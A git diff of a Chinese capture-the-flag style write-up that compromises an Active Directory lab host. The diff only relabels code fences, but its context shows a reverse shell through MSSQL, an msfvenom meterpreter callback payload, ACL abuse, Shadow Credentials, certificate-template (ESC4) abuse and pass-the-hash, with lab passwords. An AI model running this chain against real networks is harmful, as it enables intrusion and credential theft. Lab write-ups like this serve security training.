@@ -16,7 +16,7 @@ Machine Information
 
 ## 信息搜集
 
-```shell
+```bash
 ┌──(randark ㉿ kali)-[~]
 └─$ sudo ./tools/fscan-1.8.4/fscan -h 10.10.11.51
 start infoscan
@@ -161,7 +161,7 @@ Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
 
 ## Windows SMB 探测
 
-```shell
+```bash
 ┌──(randark ㉿ kali)-[~]
 └─$ crackmapexec smb sequel.htb -u "rose" -p "KxEPkKe6R8su" --rid-brute
 SMB         sequel.htb      445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False)
@@ -208,7 +208,7 @@ SMB         sequel.htb      445    DC01             1607: SEQUEL\ca_svc (SidType
 
 尝试列出共享目录
 
-```shell
+```bash
 ┌──(randark ㉿ kali)-[~]
 └─$ smbclient -U rose -L 10.10.11.51
 Password for [WORKGROUP\rose]:
@@ -229,7 +229,7 @@ Unable to connect with SMB1 -- no workgroup available
 
 看一下 `Accounting Department` 这个共享有什么东西
 
-```shell
+```bash
 ┌──(randark ㉿ kali)-[~]
 └─$ smbclient //10.10.11.51/'Accounting Department' -U rose
 Password for [WORKGROUP\rose]:
@@ -245,7 +245,7 @@ smb: \> dir
 
 将两个 `xlsx` 表格文件下载下来查看
 
-```shell
+```bash
 smb: \> get accounting_2024.xlsx
 getting file \accounting_2024.xlsx of size 10217 as accounting_2024.xlsx (26.8 KiloBytes/sec) (average 26.8 KiloBytes/sec)
 smb: \> get accounts.xlsx
@@ -269,7 +269,7 @@ getting file \accounts.xlsx of size 6780 as accounts.xlsx (18.4 KiloBytes/sec) (
 
 结合扫描到的 `mssql` 服务，以及泄露的 `sa@sequel.htb` 凭据，尝试登录 mssql 服务
 
-```shell
+```bash
 ┌──(randark ㉿ kali)-[~]
 └─$ netexec mssql sequel.htb -u sa -p MSSQLP@ssw0rd!
 [*] First time use detected
@@ -303,7 +303,7 @@ MSSQL       10.10.11.51     1433   DC01             [+] DC01\sa:MSSQLP@ssw0rd! (
 
 尝试基于 mssql 服务反弹 shell
 
-```shell
+```bash
 # Session 1
 ┌──(randark ㉿ kali)-[~]
 └─$ netexec mssql sequel.htb -u sa -p MSSQLP@ssw0rd! --local-auth -x 'powershell -e J.........pAA=='
@@ -323,7 +323,7 @@ PS C:\Windows\system32>
 
 ## 权限维持 sequel\sql_svc
 
-```shell
+```bash
 # Kali
 ┌──(randark ㉿ kali)-[~]
 └─$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.16.31 LPORT=9111 -f exe -o 10.10.16.31-9111.exe
@@ -353,7 +353,7 @@ Mode                LastWriteTime         Length Name
 
 部署载荷之后，建立监听接收 C2 会话
 
-```shell
+```bash
 msf6 > use exploit/multi/handler
 [*] Using configured payload generic/shell_reverse_tcp
 msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
@@ -415,7 +415,7 @@ IAcceptSQLServerLicenseTerms=True
 
 尝试使用 `ryan:WqSZAF6CysDQbGb3` 这个凭据，通过 `evil-winrm` 进行攻击
 
-```shell
+```bash
 ┌──(randark ㉿ kali)-[~]
 └─$ evil-winrm -i 10.10.11.51 -u ryan -p WqSZAF6CysDQbGb3
 
@@ -432,7 +432,7 @@ sequel\ryan
 
 ## 权限维持 sequel\ryan
 
-```shell
+```bash
 msf6 exploit(multi/handler) > exploit
 [*] Started reverse TCP handler on 0.0.0.0:9111
 [*] Sending stage (177734 bytes) to 10.10.11.51
@@ -456,7 +456,7 @@ Server username: SEQUEL\ryan
 
 ## BloodHound 枚举
 
-```shell
+```bash
 ┌──(randark ㉿ kali)-[~]
 └─$ bloodhound-python -c All -u ryan -p WqSZAF6CysDQbGb3 -ns 10.10.11.51 -d sequel.htb  --zip
 INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
@@ -488,7 +488,7 @@ INFO: Compressing output into 20250403132606_bloodhound.zip
 
 先将 ryan 设置成 owner
 
-```shell
+```bash
 ┌──(randark ㉿ kali)-[~]
 └─$ impacket-owneredit -new-owner ryan -target ca_svc -dc-ip 10.10.11.51 -action write sequel.htb/ryan:WqSZAF6CysDQbGb3
 Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
@@ -504,7 +504,7 @@ Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
 
 而后利用 dacledit 修改 ACL
 
-```shell
+```bash
 ┌──(randark ㉿ kali)-[~]
 └─$ impacket-dacledit -action write -target ca_svc -principal ryan -rights FullControl -ace-type allowed -dc-ip 10.10.11.51 sequel.htb/ryan:WqSZAF6CysDQbGb3
 Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
@@ -515,7 +515,7 @@ Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
 
 即可尝试获取 Shadow Credentials
 
-```shell
+```bash
 ┌──(randark ㉿ kali)-[~]
 └─$ sudo timedatectl set-ntp 0
 
@@ -548,14 +548,14 @@ Certipy v4.8.2 - by Oliver Lyak (ly4k)
 
 将票据保存至环境变量
 
-```shell
+```bash
 ┌──(randark ㉿ kali)-[~]
 └─$ export KRB5CCNAME=./ca_svc.ccache
 ```
 
 而后尝试枚举漏洞
 
-```shell
+```bash
 ┌──(randark ㉿ kali)-[~]
 └─$ certipy-ad find -scheme ldap -k -debug -target DC01.sequel.htb -dc-ip 10.10.11.51 -vulnerable -stdout
 Certipy v4.8.2 - by Oliver Lyak (ly4k)
@@ -680,7 +680,7 @@ Certificate Templates
 
 参考 ESC4 - Access Control Vulnerabilities [Active Directory - Certificate Services - Internal All The Things](https://swisskyrepo.github.io/InternalAllTheThings/active-directory/ad-adcs-certificate-services/#esc4-access-control-vulnerabilities)
 
-```shell
+```bash
 ┌──(randark ㉿ kali)-[~]
 └─$ certipy-ad template -k -template DunderMifflinAuthentication -target dc01.sequel.htb -dc-ip 10.10.11.51 -debug
 Certipy v4.8.2 - by Oliver Lyak (ly4k)
@@ -737,7 +737,7 @@ Certipy v4.8.2 - by Oliver Lyak (ly4k)
 
 得到 `administrator_10.pfx` 之后，使用证书获取 `Administrator` 的哈希
 
-```shell
+```bash
 ┌──(randark ㉿ kali)-[~]
 └─$ certipy-ad auth -pfx ./administrator_10.pfx -dc-ip 10.10.11.51
 Certipy v4.8.2 - by Oliver Lyak (ly4k)
@@ -757,7 +757,7 @@ Certipy v4.8.2 - by Oliver Lyak (ly4k)
 
 即可获取到 `Administrator` 用户的 shell
 
-```shell
+```bash
 ┌──(randark ㉿ kali)-[~]
 └─$ evil-winrm -i 10.10.11.51 -u Administrator -H 7a8d4e04986afa8ed4060f75e5a0b3ff
 
